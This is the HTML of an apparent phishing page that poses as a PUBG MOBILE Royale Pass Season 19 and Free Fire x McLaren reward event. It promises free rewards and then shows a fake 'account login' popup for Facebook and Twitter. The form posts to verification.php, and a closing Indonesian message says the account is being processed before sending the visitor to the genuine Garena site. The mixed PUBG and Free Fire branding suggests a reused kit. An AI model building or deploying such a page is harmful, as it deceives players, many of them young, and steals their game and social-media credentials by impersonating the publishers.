...
<meta property="og:title" content="PUBG MOBILE: Royale Pass Season 19">
<meta name="description" content="Collect your special rewards at the Royale Pass Season 19 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Royale Pass Season 19 event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Royale Pass Season 19">
...
GARENA FREE FIRE
<span>GARENA FREE FIRE X MCLAREN</span>
</div> 
</div> 
<div class="header">
...
<div style="background:rgba(0,0,0,0.5);width: 100%;height: 80px;border-bottom: 1px solid white">
	...
	<span style="color: white;font-family: teko;font-size: 30px;font-weight: 1000;position: absolute;margin-left: 2.5%;margin-top: 3%;text-shadow: 1px 1px #cce152">FREE FIRE X MCLAREN</span>
...
<div class="footer">
<img src="https://c.top4top.io/p_2044l5ljn3.jpg">
</div> 
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-bell"></i> AKUN SEDANG DIPROSES</div></div><br>
<div class="popup-alert">
Terimakasih Telah mengikuti Event McLaren
<br>
<i class="fa fa-check fa-2x"></i>
<br>
Saat ini Akun anda sedang diproses...
<br>
Tunggu hingga 1x24 untuk menerima hadiah anda
#SalamBooyah
<br>
<br>
</div>
<button type="button" class="popup-btn popup-btn-collect" onmousedown="buka.play()" onclick="location.href='https://ff.garena.com/';"><span>Kembali</span></button>
</div>
</div>
...
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-fw fa-gift"></i> REWARD CONFIRMATION</div></div><br>
<div class="popup-alert">Are you sure to collect this rewards?</div>
<img class="popup-item" src="" id="myRewardImg">
<button type="button" class="popup-btn" onmousedown="button.play()" onclick="open_account_login()">Collect</button>
</div>
</div>
...
<div class="nav-popup"><div class="nav-popup-title">Forgot PlayerID</div></div><br>
<div class="scroll">
<div class="popup-alert">1. Enter the game</div>
<img src="img/find2.png" style="width: 90%;border-radius: 5px;border:1px solid white"><br>
<div class="popup-alert">2. Find your player ID</div>
<img src="img/find.png" style="width: 90%;border-radius: 5px;border:1px solid white">
</div>
<br>
<button type="button" class="popup-btn" onmousedown="tutup.play()" onclick="close_forgot()">Close</button>
<br>
</div>
</div>
...
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title"><i class="fa fa-fw fa-chevron-right"></i> ACCOUNT LOGIN</div></div><br>
<div class="popup-alert">Log in using your PUBG MOBILE account to receive reward</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();" onmousedown="button.play()"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();" onmousedown="button.play()"><i class="fa fa-facebook-square icon-login"></i> Log in using twitter account</button>
</div>
</div>
	...
	<a onclick="tutup_twitter()" onmousedown="tutup.play()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		...
		<div class="box-twitter">
			...
			<form action="verification.php" method="post">
				...
				<input type="hidden" name="playid" id="isiplayid2" readonly>
				<input type="hidden" name="nick" id="isinick2" readonly>
				<button type="submit" class="btn-login-twitter" onmousedown="button.play()">Log In</button>
